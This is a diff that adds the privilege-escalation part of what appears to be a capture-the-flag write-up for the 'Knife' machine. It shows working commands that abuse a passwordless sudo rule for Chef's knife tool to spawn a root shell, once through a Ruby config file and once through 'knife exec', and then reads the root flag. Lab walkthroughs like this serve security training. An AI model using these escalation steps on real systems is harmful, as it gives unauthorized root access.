@@ -90,5 +90,96 @@
 
     james@knife:~$ 
 
+### -------Privilleges Escalation-------
 
-// 
+// Lets check james 'sudo' permissions
+
+    james@knife:~$ sudo -l
+    Matching Defaults entries for james on knife:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User james may run the following commands on knife:
+        (root) NOPASSWD: /usr/bin/knife
+        
+// We can see that james can run 'knife' with 'sudo'(root) permissions
+
+// Lets check what its 'knife'
+
+    james@knife:~$ knife
+    ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)
+
+    Usage: knife sub-command (options)
+        -s, --server-url URL             Chef Infra Server URL.
+            --chef-zero-host HOST        Host to start Chef Infra Zero on.
+            --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
+        -k, --key KEY                    Chef Infra Server API client key.
+            --[no-]color                 Use colored output, defaults to enabled.
+        -c, --config CONFIG              The configuration file to use.
+            --config-option OPTION=VALUE Override a single configuration option.
+            --defaults                   Accept default values for all questions.
+        -d, --disable-editing            Do not open EDITOR, just accept the data as is.
+        -e, --editor EDITOR              Set the editor to use for interactive commands.
+        -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
+            --[no-]fips                  Enable FIPS mode.
+        -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
+            --[no-]listen                Whether a local mode (-z) server binds to a port.
+        -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.
+        -u, --user USER                  Chef Infra Server API client username.
+            --print-after                Show the data after a destructive operation.
+            --profile PROFILE            The credentials profile to select.
+        -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
+        -v, --version                    Show Chef Infra Client version.
+        -y, --yes                        Say yes to all prompts for confirmation.
+        -h, --help                       Show this help message.
+
+        ........
+        
+        ** USER COMMANDS **
+        knife user create USERNAME DISPLAY_NAME FIRST_NAME LAST_NAME EMAIL PASSWORD (options)
+        knife user delete USER (options)
+        knife user dissociate USERNAMES
+        knife user edit USER (options)
+        knife user invite add USERNAMES
+        knife user invite list
+        knife user invite rescind [USERNAMES] (options)
+        knife user key create USER (options)
+        knife user key delete USER KEYNAME (options)
+        knife user key edit USER KEYNAME (options)
+        knife user key list USER (options)
+        knife user key show USER KEYNAME (options)
+        knife user list (options)
+        knife user reregister USER (options)
+        knife user show USER (options)
+
+        ........
+        
+        ** YAML COMMANDS **
+        knife yaml convert YAML_FILENAME [RUBY_FILENAME]
+        
+        ........
+        
+// we can see at the description that 'knife' uses 'ruby' sources scripts([RUBY_FILENAME]) and we can run a configuration file (-c, --config CONFIG              The configuration file to use.)
+
+// First lets make configuration file 
+
+    james@knife:~$ cat config.rb 
+    exec "/bin/bash -i"
+
+// lets run this file with 'knife' USER command 'user list' 
+
+    james@knife:~$ sudo knife user list -c config.rb 
+    root@knife:/home/james# id
+    uid=0(root) gid=0(root) groups=0(root)
+    root@knife:/home/james# cat /root/root.txt
+    059c752d...........................
+
+// We got root flag !!!
+
+// Other way to get root flag its to use 'ruby's' 'exec'
+
+    james@knife:~$ sudo knife exec --exec "exec '/bin/sh -i'"
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+    # cat /root/root.txt
+    059c752d........................
+
